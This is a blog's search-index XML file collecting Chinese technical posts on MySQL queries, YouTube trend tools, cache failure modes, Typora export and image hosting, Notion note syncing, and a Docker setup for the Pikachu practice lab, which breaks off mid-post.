<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>mysql的增删改查</title>
      <link href="/2022/06/24/mysql%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"/>
      <url>/2022/06/24/mysql%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="新增"><a href="#新增" class="headerlink" title="新增"></a>新增</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into B select * from A；//将A表的信息通过查询新增到B表中去</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/961e937094824e4db545cad7beaf7bc3.png"></p><h2 id="聚合查询"><a href="#聚合查询" class="headerlink" title="聚合查询"></a>聚合查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count；//返回到查询的数据总和</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/0fa023830601479db6424c0dc60e109d.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sum；//返回到查询的数据总和（只对数字有意义）</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/4dc3665ba6384690b19a4ac5ad6ab675.png"></p><p>只对数字有意义</p><p><img src="https://img-blog.csdnimg.cn/516d4a64183e43a88cf68cf7bf30b0fc.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">avg/max/min;//返回查询数据的平均值/最大值/最小值(只对数字有意义）</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/f1e2b7e763d8472b98bce4167b66d4c5.png"></p><h2 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名 group by 分组条件；</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/37abe79980374f5bacb076b78d9c66f0.png"></p><p> 这里是先执行分组，再根据分组执行每个组的聚合函数。</p><h2 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">having；</span><br></pre></td></tr></table></figure><p>group by 子句进行分组以后，需要对分组结果再进行条件过滤时，就可以使用 having。where 是在分组之前执行，如果要对分组之后的结果进行条件筛选，就需要使用 having(having 搭配 group by 使用）。</p><p>例如：求每种角色的平均薪资，除了吴九。（这里就是用 where，分组之前指定条件，先去除吴九，在分组求平均薪资。</p><p><img src="https://img-blog.csdnimg.cn/e38a693501bb40ea837125f14a9c9508.png"></p><p> 求每种角色平均薪资，只保留平均薪资 10000 以下的，这里就用 having。要先求出平均薪资才能进行筛选。</p><p><img src="https://img-blog.csdnimg.cn/e1a5caa7e00f4d268ec02cf32e6c554e.png"></p><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一种写法：select * from 表名1，表名2；</span><br><span class="line">第二种写法：select * from 表名1 join 表名2 on 条件；</span><br></pre></td></tr></table></figure><p>联合查询（较重要）是多表查询，前面的查询都是单表查询。多表查询中的核心操作 — 笛卡尔积。</p><p>笛卡尔积的运算就是将两个表的每条记录分别进行组合，得到一组新的记录。</p><p><img src="https://img-blog.csdnimg.cn/67e09ff37c0e44988b1a72458849c46b.png"></p><p> 以上记录并不都是我们想要的结果，我们可以通过筛选得到我们想要的结果。</p><p><img src="https://img-blog.csdnimg.cn/4b66590c52d04a5dbb12f6266007beb1.png"></p><p><img src="https://img-blog.csdnimg.cn/c1e39674c09e4a8a83fd4ec1deda3d1d.png"></p><p>那么 join on 后面跟条件和 用 where 跟条件有什么区别呢？</p><p>from 多个表 where 写法叫做 “内连接 “。<br>使用 join on 的写法, 既可以表示内连接, 还可以表示外连接。<br>select 列名 from 表 1 inner join 表 2 on 条件; inner join 表示是 “内连接” 其中 inner 可以省略。<br>select 列名 from 表 1 left join 表 2 on 条件; 左外连接。<br>select 列 from 表 1 right join 表 2 on 条件; 右外连接。</p><p><img src="https://img-blog.csdnimg.cn/615b6c2bfd6849d4b996737f65ab9fe4.png"></p><h2 id="自连接"><a href="#自连接" class="headerlink" title=" 自连接"></a> 自连接</h2><p>自连接是指在同一张表连接自身进行查询。</p><p>例如：显示所有 “ 语文 ” 成绩比 “数学” 成绩高的成绩信息。 首先要知道语文和数学这两门课程的 course_id，先找到这俩门课程。然后在比较他俩高低。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select s1.student_id,s1.score,s2.score from score as s1,score as s2 where s1.student_id=s2.student_id and s1.course_id=3 and s2.course_id=1 and s1.score&gt;s2.score;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2c05780c9a5a42728b38adb3d09e6b23.png"></p><h2 id="合并查询"><a href="#合并查询" class="headerlink" title="合并查询"></a>合并查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union；//这个可自动去重</span><br><span class="line">union all；//这个不可自动去重</span><br></pre></td></tr></table></figure><p> 该操作符用于取得两个结果集的并集。</p><p>例如：查询 id 小于 3，或者名字为 “英文” 的课程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from course where id&lt;3 union select * from course where name=&#x27;英文&#x27;; </span><br></pre></td></tr></table></figure><p>或者使用 or 来实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from course where id&lt;3 or name=&#x27;英文&#x27;；</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/bilicard.css" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>YouTube和twitter的热点榜单</title>
      <link href="/2022/06/24/YouTube%E5%92%8Ctwitter%E7%9A%84%E7%83%AD%E7%82%B9%E6%A6%9C%E5%8D%95/"/>
      <url>/2022/06/24/YouTube%E5%92%8Ctwitter%E7%9A%84%E7%83%AD%E7%82%B9%E6%A6%9C%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<p>经常需要上YouTube和推特学习和看看大佬的观点和正在做的事，竟然国内视频平台都有对各种榜单数据有进行一些聚合，我就在想YouTube和Twitter应该有这类的热点榜单，能省去我自己去筛选，直接看top10反而更高效些，所以就整理了这篇</p><h2 id="推荐工具-1：Youtube-工作室"><a href="#推荐工具-1：Youtube-工作室" class="headerlink" title="推荐工具 1：Youtube 工作室"></a><strong>推荐工具 1：Youtube 工作室</strong></h2><blockquote><p><em>网址：<a href="https://studio.youtube.com/">https://studio.youtube.com</a></em></p></blockquote><p><strong>YouTube 工作室</strong>即 Youtube Studio，这是每个频道的后台，可以设置频道的各种功能，同时可查看频道的详细数据，是 YouTube 运营者最常用到的工具。</p><p>YouTube 工作室后台数据非常详细，有了这些数据，就能有针对性地优化视频，从而获取更多流量推荐。</p><p>但注意，<strong>如果你只是用它来看数据上下波动是没什么意义的，只有从数据的表象找出规律，并用于调整你接下来的创作和发布策略，才是正确的用法。</strong></p><p><img src="https://pic2.zhimg.com/v2-3175290cfeac65808314bc0724500be9_r.jpg"></p><h2 id="推荐工具-2：YouTube-搜索功能"><a href="#推荐工具-2：YouTube-搜索功能" class="headerlink" title="推荐工具 2：YouTube 搜索功能"></a><strong>推荐工具 2：YouTube 搜索功能</strong></h2><p>油管搜索功能很强大，但一般人主要用于搜索视频资料，其实它也可以作为运营辅助工具，不论是找创作灵感，还是寻找关键字，对运营油管频道都很帮助。</p><p><strong>a. 搜索关键词：</strong>搜索框自动弹出联想关键词和长尾词，这些关键词一般是有较高权重的，可以用于频道或视频关键词。</p><p><strong>b. 搜索视频</strong>：在搜索结果里找到历史数据较好或者近期数据较好的相关视频，全面分析这些视频的缩略图、标题、描述、标签数据趋势等，再参考创作和运营。</p><p><img src="https://pic2.zhimg.com/v2-72f67fe59f9bd879e0f57d5cf7da9971_r.jpg"></p><h2 id="推荐工具-3：Google-Trends"><a href="#推荐工具-3：Google-Trends" class="headerlink" title="推荐工具 3：Google Trends"></a>推荐工具 3：Google Trends</h2><blockquote><p><em>网址：<a href="http://trends.google.com/">http://trends.google.com</a></em></p></blockquote><p>谷歌趋势是谷歌旗下的一款搜索工具，它基于谷歌搜索，可以查看某个关键词在一定时间范围内的受欢迎程度和搜索趋势。</p><p>Google Trends 对于 YouTube 运营来说，一般用于了解<strong>某个领域 / 主题</strong>的搜索热度以及发展趋势，帮助 YouTube 创作者或运营者更好地选题创作以及运营频道。</p><p><img src="https://pic2.zhimg.com/v2-6cb59878091bf26fe732739050e6010d_r.jpg"></p><h2 id="推荐工具-4：socialblade"><a href="#推荐工具-4：socialblade" class="headerlink" title="推荐工具 4：socialblade"></a>推荐工具 4：socialblade</h2><blockquote><p><em>网址：<a href="http://socialblade.com/">http://socialblade.com</a></em></p></blockquote><p>Socialblade 是一个数据抓取和分析的网站，内容不仅包括 YouTube，还有 FB、TikTok Twitter、Instagram 等等。</p><p>在这个网站上，查看油管各个分类的频道排名，还可以按照国家和地区来查看频道排名。还可以查看某个频道的详细数据，包括<strong>订阅、播放、收益</strong>等。</p><p><img src="https://pic2.zhimg.com/v2-6b6774902cf1f872ecc94b54a53ef089_r.jpg"></p><h2 id="推荐工具-5：TubeBuddy"><a href="#推荐工具-5：TubeBuddy" class="headerlink" title="推荐工具 5：TubeBuddy"></a><strong>推荐工具 5：TubeBuddy</strong></h2><blockquote><p><em>网址：<a href="http://tubebuddy.com/">http://tubebuddy.com</a></em></p></blockquote><p>TubeBuddy 是一个免费的浏览器扩展程序，可以在 Chrome 或火狐浏览器中安装。主要用来查询分析热门关键词，帮助你选择判断 Tags 标签，可以让更多用户精准地找到你所上传的视频。</p><p>不仅能查看自己的视频 tags 标签，还能看别人视频的 tag 标签，当看到和你的视频相关的，可以添加到你自己的视频中。</p><p><img src="https://pic4.zhimg.com/v2-aa6448d3a5ec24f42f7cc75632ea4ee7_r.jpg"></p><h2 id="推荐工具-6：vidIQ"><a href="#推荐工具-6：vidIQ" class="headerlink" title="推荐工具 6：vidIQ"></a><strong>推荐工具 6：vidIQ</strong></h2><blockquote><p><em>网址：<a href="http://vidiq.com/">http://vidiq.com</a></em></p></blockquote><p>vidIQ 和 tubebuddy 大同小异，主要用于添加标签和分析视频关键词。vidiq 显示的数据很多，但对多数人而言，只重点关注几个核心数据即可。</p><p>vidiq 有免费版和收费版，免费版只能使用基础的功能，收费版也分几个版本，一般都是绑定账号的，越高级的版本功能越多。</p><p><img src="https://pic2.zhimg.com/v2-749034ed7697b69248f522ea76b1ea49_r.jpg"></p><h2 id="推荐工具-7：Grammarly"><a href="#推荐工具-7：Grammarly" class="headerlink" title="推荐工具 7：Grammarly"></a><strong>推荐工具 7：Grammarly</strong></h2><blockquote><p><strong>网址：</strong><em><a href="http://grammry.com/">http://Grammry.com</a></em></p></blockquote><p>Grammarly 最早出自乌克兰基辅一家公司，可以自动检测英文是否存在语法、拼写和标点等错误，并为用户提供纠正功能。</p><p>注册流程很简单，直接关联 Google 账户就行，而且不必下载，可以在浏览器安装插件就可以用。<strong>对于英语水平比较一般或者比较差的运营者，强烈推荐使用</strong>。</p><ul><li>  <a href="https://zhuanlan.zhihu.com/p/68444443">https://zhuanlan.zhihu.com/p/68444443</a>)</li></ul><link rel="stylesheet" href="/css/bilicard.css" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 自媒体 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> YouTube,twitter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>缓存穿透、缓存击穿、缓存雪崩区别和解决方案</title>
      <link href="/2022/06/21/%E7%BC%93%E5%AD%98%E7%A9%BF%E9%80%8F%E3%80%81%E7%BC%93%E5%AD%98%E5%87%BB%E7%A9%BF%E3%80%81%E7%BC%93%E5%AD%98%E9%9B%AA%E5%B4%A9%E5%8C%BA%E5%88%AB%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>/2022/06/21/%E7%BC%93%E5%AD%98%E7%A9%BF%E9%80%8F%E3%80%81%E7%BC%93%E5%AD%98%E5%87%BB%E7%A9%BF%E3%80%81%E7%BC%93%E5%AD%98%E9%9B%AA%E5%B4%A9%E5%8C%BA%E5%88%AB%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h2 id="缓存处理流程"><a href="#缓存处理流程" class="headerlink" title="缓存处理流程"></a>缓存处理流程</h2><p>前台请求，后台先从缓存中取数据，取到直接返回结果，取不到时从数据库中取，数据库取到更新缓存，并返回结果，数据库也没取到，那直接返回空结果</p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/2022062170.png" alt="img"></p><h2 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h2><ul><li><p> 描述：缓存穿透是指缓存和数据库中都没有的数据，而用户不断发起请求，如发起为id为“-1”的数据或id为特别大不存在的数据。这时的用户很可能是攻击者，攻击会导致数据库压力过大。</p></li><li><p>解决方案：</p><ol><li>接口层增加校验，如用户鉴权校验，id做基础校验，id&lt;=0的直接拦截；</li><li>从缓存取不到的数据，在数据库中也没有取到，这时也可以将key-value对写为key-null，缓存有效时间可以设置短点，如30秒（设置太长会导致正常情况也没法使用）。这样可以防止攻击用户反复用同一个id暴力攻击</li></ol></li></ul><h2 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a>缓存击穿</h2><ul><li>描述：   缓存击穿是指缓存中没有但数据库中有的数据（一般是缓存时间到期），这时由于并发用户特别多，同时读缓存没读到数据，又同时去数据库去取数据，引起数据库压力瞬间增大，造成过大压力</li><li>解决方案：</li></ul><ol><li>设置热点数据永远不过期</li><li>加互斥锁，互斥锁参考代码如下：</li></ol><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621image-20220621153219841.png" alt="image-20220621153219841" style="zoom: 33%;" /><ul><li>说明：</li></ul><ol><li> 缓存中有数据，直接走上述代码13行后就返回结果了</li><li>缓存中没有数据，第1个进入的线程，获取锁并从数据库去取数据，没释放锁之前，其他并行进入的线程会等待100ms，再重新去缓存取数据。这样就防止都去数据库重复取数据，重复往缓存中更新数据情况出现</li><li>当然这是简化处理，理论上如果能根据key值加锁就更好了，就是线程A从数据库取key1的数据并不妨碍线程B取key2的数据，上面代码明显做不到这点</li></ol><h2 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h2><ul><li>描述：    缓存雪崩是指缓存中数据大批量到过期时间，而查询数据量巨大，引起数据库压力过大甚至down机。和缓存击穿不同的是，缓存击穿指并发查同一条数据，缓存雪崩是不同数据都过期了，很多数据都查不到从而查数据库。</li><li>解决方案：</li></ul><ol><li>缓存数据的过期时间设置随机，防止同一时间大量数据过期现象发生</li><li>如果缓存数据库是分布式部署，将热点数据均匀分布在不同搞得缓存数据库中</li><li>设置热点数据永远不过期</li></ol><link rel="stylesheet" href="/css/bilicard.css" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用typora转换word等富文本格式</title>
      <link href="/2022/06/21/%E4%BD%BF%E7%94%A8typora%E8%BD%AC%E6%8D%A2word%E7%AD%89%E5%AF%8C%E6%96%87%E6%9C%AC%E6%96%87%E6%A1%A3/"/>
      <url>/2022/06/21/%E4%BD%BF%E7%94%A8typora%E8%BD%AC%E6%8D%A2word%E7%AD%89%E5%AF%8C%E6%96%87%E6%9C%AC%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<p>使用typora写的markdown文档有时需要导出为word文档这些富文本格式（真的讨厌富文本），其实typora是支持，不过需要下载第三方的转换工具pandoc，所以就需要安装配置</p><h2 id="Pandoc安装"><a href="#Pandoc安装" class="headerlink" title="Pandoc安装"></a>Pandoc安装</h2><p>一个强大的命令行工具 **<a href="https://link.juejin.cn/?target=https://pandoc.org/">Pandoc</a>**，用于将文件从一种标记语言转换为另一种标记语言。常用的标记语言包括 Markdown、ReStructuredText、HTML、LaTex、ePub 和 Microsoft Word DOCX</p><p>Mac上直接使用 brew 安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install pandoc</span><br></pre></td></tr></table></figure><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621image-20220621144922017.png" alt="image-20220621144922017" style="zoom:33%;" /><h2 id="在typora配置转换"><a href="#在typora配置转换" class="headerlink" title="在typora配置转换"></a>在typora配置转换</h2><p>下载完成后typora会自动寻找路径匹配</p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621image-20220621145542103.png" alt="image-20220621145542103" style="zoom: 33%;" /><p>接下来就可以把md文件转换导出更多富文本格式了，除此之处，还可以通过命令行方式来实现</p><p><strong>Markdown 转 Html</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pandoc index.md -o index.html -c Github.css</span><br></pre></td></tr></table></figure><p><strong>Markdown 转 Word</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pandoc index.md -o index.docx -c Github.css</span><br></pre></td></tr></table></figure><h2 id="导出富文本"><a href="#导出富文本" class="headerlink" title="导出富文本"></a>导出富文本</h2><p>通过pandoc导出的word文档兼容性适配性上我还是非常满意的</p><blockquote><p>markdown原文件</p></blockquote><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621image-20220621150412400.png" alt="image-20220621150412400" style="zoom:33%;" /><blockquote><p>导出word格式</p></blockquote><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621image-20220621150517722.png" alt="image-20220621150517722" style="zoom:33%;" /><p>可以看出来适配还是可以的</p><p>感谢你的阅读，有问题可以email联系我</p><link rel="stylesheet" href="/css/bilicard.css" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> typora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>typora+upic+阿里云oss写作流</title>
      <link href="/2022/06/21/typora+upic+%E9%98%BF%E9%87%8C%E4%BA%91oss%E5%86%99%E4%BD%9C%E6%B5%81/"/>
      <url>/2022/06/21/typora+upic+%E9%98%BF%E9%87%8C%E4%BA%91oss%E5%86%99%E4%BD%9C%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<p> 搭建个人博客后写文章不可避免的要选择写作工具和图床</p><h2 id="选择typora"><a href="#选择typora" class="headerlink" title="选择typora"></a>选择typora</h2><p>目前主力是使用typora写作，这款工具简洁易用，所见即所得，没有那么多花里胡哨，不愧是国产之光</p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621image-20220621102723072.png" alt="image-20220621102723072"></p><h2 id="图床选择自己搭建的阿里云oss图床"><a href="#图床选择自己搭建的阿里云oss图床" class="headerlink" title="图床选择自己搭建的阿里云oss图床"></a>图床选择自己搭建的阿里云oss图床</h2><p>图床选择的话之前一直白嫖jsd，自从jsd被限制后就转用了知乎的，后面知乎图床也不对外开放，兜兜转转一堆麻烦，图片迁移来迁移去很麻烦，果然免费才是最贵的，自己用阿里云oss搭建了个图床，流量费也还可以，毕竟图片是存在自己这里的，而且速度和稳定都可以，当然也搭过github图床，因为在国内不是很稳定，我就老是上传不了，梯子需要一直切换节点改host等很麻烦，作罢</p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621image-20220621103512878.png" alt="image-20220621103512878"></p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621image-20220621103622842.png" alt="image-20220621103622842"></p><h2 id="图床上传工具upic"><a href="#图床上传工具upic" class="headerlink" title="图床上传工具upic"></a>图床上传工具upic</h2><p>搭建后图床后需要一款工具连接图床，阿里云官方的不好用，我是mac端所以在GitHub上找了个开源工具upic，应用商店现在有上架，配置起来很简单，支持截图剪切板上传</p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621image-20220621104007183.png" alt="image-20220621104007183"></p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621image-20220621104031068.png" alt="image-20220621104031068"></p><p>typora支持upic的上传服务</p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621image-20220621104150735.png" alt="image-20220621104150735"></p><h2 id="写作流"><a href="#写作流" class="headerlink" title="写作流"></a>写作流</h2><p>用typora写作，然后图片直接截图，粘贴，typora会自动将截图上传至我的图床，然后继续写作，相比之前上传然后粘贴图片url简单多了，而且避免了思路在来回切换时的打断，写完后直接保存更新至我的博客中，当然一篇博客可以一键多平台同步，还有typora写作的md文档可以选择工具转换适配微信公众号，这些技巧下面会继续说</p><p>感谢您的阅读，有什么问题可以email找我</p><link rel="stylesheet" href="/css/bilicard.css" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工作流 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用i微信阅读笔记一键同步到notion</title>
      <link href="/2022/06/21/%E5%B0%86%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6%E7%9A%84%E7%AC%94%E8%AE%B0%E4%B8%80%E9%94%AE%E5%90%8C%E6%AD%A5%E5%88%B0_notion_/"/>
      <url>/2022/06/21/%E5%B0%86%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6%E7%9A%84%E7%AC%94%E8%AE%B0%E4%B8%80%E9%94%AE%E5%90%8C%E6%AD%A5%E5%88%B0_notion_/</url>
      
        <content type="html"><![CDATA[<p><a href="https://secreter.github.io/ireader/index.html">i 微信读书插件</a>，之前已经支持了将笔记同步到 flomo 和 readwise，notion</p><p>由于 notion 的接口稍微比其他第三方复杂一点，一共需要两个步骤，所以单独写一篇使用文档。</p><h2 id="notion-效果"><a href="#notion-效果" class="headerlink" title="notion 效果"></a><strong>notion 效果</strong></h2><p>我们先来看下同步成功的效果。</p><p>• 插件会在一个目录 (page) 下，自动创建一个叫 “i 微信读书” 的表格（database）。 会记录每本书的标题、链接、作者、简介、评分、字数等基本信息。</p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/2022062120220621-20220621112048787.png"></p><p>• 我们可以使用 notion 的视图功能，来展示不同的样式。</p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621FSPnmh.png"></p><p>• 点击每条记录，会进入到笔记详情当中，包含每本书所有的划线和评论。</p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621pxn2Cg.png"><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621xud1Oi.png"></p><h2 id="i-微信读书插件配置"><a href="#i-微信读书插件配置" class="headerlink" title="i 微信读书插件配置"></a><strong>i 微信读书插件配置</strong></h2><p>i 微信读书插件需要配置两个参数，分别对应 notion 的两个步骤。 一个是 token，一个是 page_id。</p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621x6ifyG.png"></p><h3 id="token"><a href="#token" class="headerlink" title="token"></a><strong>token</strong></h3><p>首先我们要理解，插件相当于创建了一个机器人，帮你把微信读书笔记，写到了你的 notion 笔记本当中。 而恰好 notion 支持创建机器人，这里的 token 就是机器人的授权码，谁拿到这个授权码，谁就可以对机器人发号施令。（当然，机器人的权限是受限制的，并且主人可以随时关闭和删除机器人，所以不用担心安全问题）</p><p>那怎么创建 notion 机器人呢？其实 notion 有文档，为了操作简单，我可以直接告诉你。</p><ol><li>登陆 notion。2. 访问 <a href="https://www.notion.so/my-integrations">https://www.notion.so/my-integrations</a>。3. 填写必要的信息，点击创建。</li></ol><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621B1BfMN.png"><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621XP1Dk5.png"></p><p>就这么简单，可以看到，这里我创建了一个叫 ireader 的机器人，上面的 Secrets 就是我说的 token，复制它填写到插件的第一个输入框即可。</p><h3 id="page-id"><a href="#page-id" class="headerlink" title="page_id"></a><strong>page_id</strong></h3><p>page_id 主要是 notion 用来权限控制的，你可以理解为，你虽然创建了一个 notion 机器人，但他可以访问你的哪个目录，哪个文件，其实需要你给他开一下权限。就像给你的朋友分享文档权限一样。</p><p>所有这里，我们要找一个页面，给机器人开启编辑权限即可。</p><p>例如，我在 “笔记” 页面下，点击“share”，邀请了机器人 ireader 。</p><blockquote><p>注意，这里父级要的是一个 page , 不是 database。</p></blockquote><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621image-20220621100456286.png"></p><p>机器人对这个页面有了编辑权限，地址栏中的后面那串字符串就是 page_id ，我们拷贝复制到第二个输入框即可。 注意，如果你的目录名称是英文，URL 上除去英文名称的部分才是 pageid</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a><strong>验证</strong></h3><p>我们在插件中填入 token 和 page_id 后，点击同步，可以看到同步成功，则说明配置成功，后续将不用重新配置，每本书轻轻一点即可。</p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621x6ifyG.png"></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a><strong>安装</strong></h2><h3 id="可以在-Chrome-应用商店搜索-“i-微信读书”-安装插件"><a href="#可以在-Chrome-应用商店搜索-“i-微信读书”-安装插件" class="headerlink" title="可以在 Chrome 应用商店搜索 “i 微信读书” 安装插件"></a><strong>可以在 Chrome 应用商店搜索 “i 微信读书” 安装插件</strong></h3><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621TfUISd.png"></p><h3 id="无法访问-google-的朋友，可以访问官网进行手动下载安装。"><a href="#无法访问-google-的朋友，可以访问官网进行手动下载安装。" class="headerlink" title="无法访问 google 的朋友，可以访问官网进行手动下载安装。"></a><strong>无法访问 google 的朋友，可以访问官网进行手动下载安装。</strong></h3><blockquote><p><a href="https://secreter.github.io/ireader/index.html">https://secreter.github.io/ireader/index.html</a></p></blockquote><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220621iwVpYm.png"></p><link rel="stylesheet" href="/css/bilicard.css" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 效率工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> notion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试靶场pikachu搭建（docker）</title>
      <link href="/2022/06/15/Docker%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0pikachu/"/>
      <url>/2022/06/15/Docker%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0pikachu/</url>
      
        <content type="html"><![CDATA[<p>“如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它”</p><p>Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意</p><h2 id="下载pikachu到本地"><a href="#下载pikachu到本地" class="headerlink" title="下载pikachu到本地"></a>下载pikachu到本地</h2><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">下载点击这里</a></p><p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220615CVtmzU.png" alt="image-20220615170740536"></p><h2 id="Docker上部署前的准备"><a href="#Docker上部署前的准备" class="headerlink" title="Docker上部署前的准备"></a>Docker上部署前的准备</h2><p>首先得提前安装好”PHP+MYSQL+中间件（如apache,nginx等）”的基础环境</p><p>在docker直接输入以下命令：</p><p><code>docker pull mysql  </code></p><p><code>docker pull php</code></p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220615W6C3TI.png" alt="image-20220615171034456" style="zoom:33%;" /><h2 id="部署pikachu"><a href="#部署pikachu" class="headerlink" title="部署pikachu"></a>部署pikachu</h2><ol><li>切换到pikachu本地路径</li><li>输入以下命令（注意最后有个点，默认使用 “上下文目录（Context）下的名为Dockerfile 的文件作为 Dockerfile”）</li></ol><p><code>docker build -t &quot;pikachu&quot; .</code></p><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220615s32Tqh.png" alt="image-20220615171348560" style="zoom:33%;" /><ol start="3"><li>部署运行成功</li></ol><img src="https://moyaopicture.oss-cn-shenzhen.aliyuncs.com/img/20220615gnxZrQ.png" 